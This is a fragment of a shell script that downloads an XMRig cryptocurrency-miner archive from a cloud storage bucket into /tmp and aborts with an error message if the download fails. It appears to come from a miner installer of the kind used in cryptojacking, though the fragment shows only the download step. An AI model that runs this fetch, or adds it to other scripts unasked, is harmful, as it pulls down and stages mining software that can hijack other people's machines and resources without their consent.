...
if ! curl -L --progress-bar "https://delamain-1301685813.cos.ap-shanghai.myqcloud.com/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
  echo "ERROR: Can't download https://delamain-1301685813.cos.ap-shanghai.myqcloud.com/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
  exit 1
fi
